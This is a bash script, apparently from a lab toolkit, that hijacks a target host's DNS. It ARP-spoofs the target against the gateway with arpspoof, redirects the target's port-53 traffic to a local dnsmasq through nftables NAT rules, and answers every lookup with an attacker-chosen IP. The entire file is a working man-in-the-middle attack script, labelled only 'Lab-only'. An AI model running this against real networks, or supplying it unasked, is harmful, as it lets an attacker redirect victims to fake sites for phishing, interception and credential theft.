#!/usr/bin/env bash
# Answer DNS on this host (dnsmasq) and redirect TARGET's port-53 traffic here via ARP spoofing,
# so lookups resolve to FAKE_IP instead of the real answer. Lab-only.
# Usage: TARGET=<ip> FAKE_IP=<ip> [GW=<ip>] [DURATION=20] ./dns-hijack.sh
set -euo pipefail
. "$(dirname "$0")/common.sh"
need dnsmasq; need arpspoof; need nft; need_target
: "${FAKE_IP:?set FAKE_IP=<ip> to return for every lookup}"
[[ -n $GW ]] || { echo "no gateway found on $IFACE, set GW=<ip>" >&2; exit 2; }
conf=$(mktemp); trap 'rm -f "$conf"; sudo nft delete table ip shuntlab_dnshijack 2>/dev/null || true; kill "${arp_pid:-0}" 2>/dev/null || true' EXIT
cat >"$conf" <<EOF
interface=$IFACE
bind-interfaces
port=53
no-resolv
no-hosts
address=/#/$FAKE_IP
EOF
# the victim's port-53 packets reach us addressed to the real resolver: redirect them to our dnsmasq
sudo nft add table ip shuntlab_dnshijack
sudo nft "add chain ip shuntlab_dnshijack pre { type nat hook prerouting priority dstnat; }"
sudo nft "add rule ip shuntlab_dnshijack pre iifname \"$IFACE\" ip saddr $TARGET udp dport 53 redirect to :53"
sudo arpspoof -i "$IFACE" -t "$TARGET" "$GW" >/dev/null 2>&1 &
arp_pid=$!
echo "fake DNS on $IFACE for ${DURATION}s, answering everything with $FAKE_IP"
sudo timeout "$DURATION" dnsmasq -k -C "$conf" --pid-file="$(mktemp -u)" || true
